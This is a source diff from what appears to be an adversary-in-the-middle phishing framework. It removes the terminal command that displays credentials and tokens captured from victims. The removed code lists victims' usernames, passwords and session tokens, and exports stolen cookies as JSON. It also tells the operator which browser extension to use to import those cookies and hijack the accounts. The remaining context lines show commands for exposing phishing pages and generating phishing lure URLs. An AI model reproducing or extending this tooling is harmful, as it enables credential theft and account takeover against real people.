@@ -129,12 +129,6 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("proxy: %v", err)
 			}
-		case "sessions":
-			cmd_ok = true
-			err := t.handleSessions(args[1:])
-			if err != nil {
-				log.Error("sessions: %v", err)
-			}
 		case "phishlets":
 			cmd_ok = true
 			err := t.handlePhishlets(args[1:])
@@ -386,179 +380,7 @@ func (t *Terminal) handleProxy(args []string) error {
 	return fmt.Errorf("invalid syntax: %s", args)
 }
 
-func (t *Terminal) handleSessions(args []string) error {
-	lblue := color.New(color.FgHiBlue)
-	dgray := color.New(color.FgHiBlack)
-	lgreen := color.New(color.FgHiGreen)
-	yellow := color.New(color.FgYellow)
-	lyellow := color.New(color.FgHiYellow)
-	lred := color.New(color.FgHiRed)
-	cyan := color.New(color.FgCyan)
-	white := color.New(color.FgHiWhite)
-
-	pn := len(args)
-	if pn == 0 {
-		cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "time"}
-		sessions, err := t.db.ListSessions()
-		if err != nil {
-			return err
-		}
-		if len(sessions) == 0 {
-			log.Info("no saved sessions found")
-			return nil
-		}
-		var rows [][]string
-		for _, s := range sessions {
-			tcol := dgray.Sprintf("none")
-			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-				tcol = lgreen.Sprintf("captured")
-			}
-			row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
-			rows = append(rows, row)
-		}
-		log.Printf("\n%s\n", AsTable(cols, rows))
-		return nil
-	} else if pn == 1 {
-		id, err := strconv.Atoi(args[0])
-		if err != nil {
-			return err
-		}
-		sessions, err := t.db.ListSessions()
-		if err != nil {
-			return err
-		}
-		if len(sessions) == 0 {
-			log.Info("no saved sessions found")
-			return nil
-		}
-		s_found := false
-		for _, s := range sessions {
-			if s.Id == id {
-				_, err := t.cfg.GetPhishlet(s.Phishlet)
-				if err != nil {
-					log.Error("%v", err)
-					break
-				}
-
-				s_found = true
-				tcol := dgray.Sprintf("empty")
-				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-					tcol = lgreen.Sprintf("captured")
-				}
-
-				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
-				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
-				log.Printf("\n%s\n", AsRows(keys, vals))
-
-				if len(s.Custom) > 0 {
-					tkeys := []string{}
-					tvals := []string{}
-
-					for k, v := range s.Custom {
-						tkeys = append(tkeys, k)
-						tvals = append(tvals, cyan.Sprint(v))
-					}
-
-					log.Printf("[ %s ]\n%s\n", white.Sprint("custom"), AsRows(tkeys, tvals))
-				}
-
-				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-					if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-						//var str_tokens string
-
-						tkeys := []string{}
-						tvals := []string{}
-
-						for k, v := range s.BodyTokens {
-							tkeys = append(tkeys, k)
-							tvals = append(tvals, white.Sprint(v))
-						}
-						for k, v := range s.HttpTokens {
-							tkeys = append(tkeys, k)
-							tvals = append(tvals, white.Sprint(v))
-						}
-
-						log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
-					}
-					if len(s.CookieTokens) > 0 {
-						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
-						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
-						log.Printf("%s %s %s %s%s\n\n", dgray.Sprint("(use"), cyan.Sprint("StorageAce"), dgray.Sprint("extension to import the cookies:"), white.Sprint("https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo"), dgray.Sprint(")"))
-					}
-				}
-				break
-			}
-		}
-		if !s_found {
-			return fmt.Errorf("id %d not found", id)
-		}
-		return nil
-	} else if pn == 2 {
-		switch args[0] {
-		case "delete":
-			if args[1] == "all" {
-				sessions, err := t.db.ListSessions()
-				if err != nil {
-					return err
-				}
-				if len(sessions) == 0 {
-					break
-				}
-				for _, s := range sessions {
-					err = t.db.DeleteSessionById(s.Id)
-					if err != nil {
-						log.Warning("delete: %v", err)
-					} else {
-						log.Info("deleted session with ID: %d", s.Id)
-					}
-				}
-				t.db.Flush()
-				return nil
-			} else {
-				rc := strings.Split(args[1], ",")
-				for _, pc := range rc {
-					pc = strings.TrimSpace(pc)
-					rd := strings.Split(pc, "-")
-					if len(rd) == 2 {
-						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
-						if err != nil {
-							log.Error("delete: %v", err)
-							break
-						}
-						e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
-						if err != nil {
-							log.Error("delete: %v", err)
-							break
-						}
-						for i := b_id; i <= e_id; i++ {
-							err = t.db.DeleteSessionById(i)
-							if err != nil {
-								log.Warning("delete: %v", err)
-							} else {
-								log.Info("deleted session with ID: %d", i)
-							}
-						}
-					} else if len(rd) == 1 {
-						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
-						if err != nil {
-							log.Error("delete: %v", err)
-							break
-						}
-						err = t.db.DeleteSessionById(b_id)
-						if err != nil {
-							log.Warning("delete: %v", err)
-						} else {
-							log.Info("deleted session with ID: %d", b_id)
-						}
-					}
-				}
-				t.db.Flush()
-				return nil
-			}
-		}
-	}
-	return fmt.Errorf("invalid syntax: %s", args)
-}
+// handleSessions removed - session system disabled
 
 func (t *Terminal) handlePhishlets(args []string) error {
 	pn := len(args)
@@ -1204,12 +1026,12 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
 
-	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
-		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
-	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
-	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
-	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
-	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
+	// sessions command removed - session system disabled
+	// h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", ...)
+	// h.AddSubCommand("sessions", nil, "", ...)
+	// h.AddSubCommand("sessions", nil, "<id>", ...)
+	// h.AddSubCommand("sessions", []string{"delete"}, ..., ...)
+	// h.AddSubCommand("sessions", []string{"delete", "all"}, ..., ...)
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
